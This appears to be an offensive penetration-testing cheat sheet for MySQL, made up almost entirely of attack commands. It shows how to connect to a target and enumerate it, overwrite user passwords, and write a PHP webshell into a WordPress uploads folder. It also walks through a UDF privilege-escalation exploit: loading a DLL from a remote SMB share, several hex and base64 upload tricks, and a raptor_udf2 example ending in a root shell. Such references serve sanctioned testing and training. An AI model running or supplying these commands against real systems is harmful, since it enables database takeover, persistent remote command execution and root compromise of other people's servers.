## Connect to Database
```
mysql -u <TARGET_USER> -p'<PASSWORD>' -h <TARGET_IP> -P 3306 --ssl-verify-server-cert=disabled
```
## Commands
```
select * from sys.database_principals;
SHOW GRANTS FOR CURRENT_USER;
SHOW DATABASES;
USE <DATABASE_NAME>;
SHOW TABLES;
DESCRIBE <TABLE_NAME>;
SELECT * FROM <TABLE_NAME>;
UPDATE [table] SET [password_column] = '[new_password]' WHERE [user_identifier_column] = '[user_id]';
```
To load `.sql` file (Login to `MySQL`)
```
source <.sql>
```
## Webshell injection
```
SELECT "<?php echo shell_exec($_GET['cmd']);?>" INTO OUTFILE "/var/www/https/blogblog/wp-content/uploads/shell.php";
```
## User Defined Function (UDF) exploit
Check user privilege in MySQL (Read and Write Files!)
```
select * from mysql.user where user = substring_index(user(), '@', 1) ;
```
Check the architecture of MySQL and OS
```
select @@version_compile_os, @@version_compile_machine;
show variables like '%compile%';
```
Check the path of the MySQL plugin directory
```
SELECT @@plugin_dir;
SHOW VARIABLES LIKE 'plugin%';
```
Note: In older versions you can upload the DLL file to the following locations and create new UDF functions.  
• @@datadir  
• @@basedir\bin  
• C:\windows  
• C:\windows\system  
• C:\windows\system32  

### Upload a binary file

#### Direct File Load with LOAD_FILE() and INTO DUMPFILE
```
select load_file('\\\\192.168.0.19\\network\\lib_mysqludf_sys_64.dll') into dumpfile
"D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll";
```

#### Hex-Encoded DLL Dump
```
select hex(load_file('/usr/share/metasploitframework/data/exploits/mysql/lib_mysqludf_sys_64.dll')) into dumpfile
'/tmp/udf.hex';
```
#### DLL from Raw Hex Literal in SQL
```
select
0x4d5a90000300000004000000ffff0000b80000000000000040000000000000000000000000000000000
000000… into dump file "D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-
winx64\\lib\\plugin\\udf.dll";
```
#### Direct Hex Injection via SQL
```
INSERT INTO temp(data) VALUES (0x4d5a...);
UPDATE temp SET data = CONCAT(data, 0x...);
SELECT data FROM temp INTO DUMPFILE 'D:\\MySQL\\...\\plugin\\udf.dll';
```

#### LOAD DATA INFILE + Table + Dump
```
LOAD DATA INFILE '\\\\192.168.0.19\\network\\udf.hex'
INTO TABLE temp FIELDS TERMINATED BY '...' (data);
SELECT UNHEX(data) FROM temp INTO DUMPFILE '...\\udf.dll';
```

#### TO_BASE64() / FROM_BASE64() (MySQL 5.6.1+)
```
SELECT TO_BASE64(LOAD_FILE('/path/to/udf.dll')) INTO DUMPFILE '/tmp/udf.b64';
-- Later:
SELECT FROM_BASE64("base64data...") INTO DUMPFILE '...\\plugin\\udf.dll';
```
#### Command-line Upload via SQL Client
```
mysql -h192.168.0.30 -uuser -ppass < /tmp/udf.b64
```
### Exploitation example
```
$ gcc -g -c raptor_udf2.c
$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
$ mysql -u root -p
Enter password:
[...]
mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
mysql> create function do_system returns integer soname 'raptor_udf2.so';
mysql> select * from mysql.func;
+-----------+-----+----------------+----------+
| name      | ret | dl             | type     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | function |
+-----------+-----+----------------+----------+
mysql> select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');
mysql> \! sh
sh-2.05b$ cat /tmp/out
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)
```
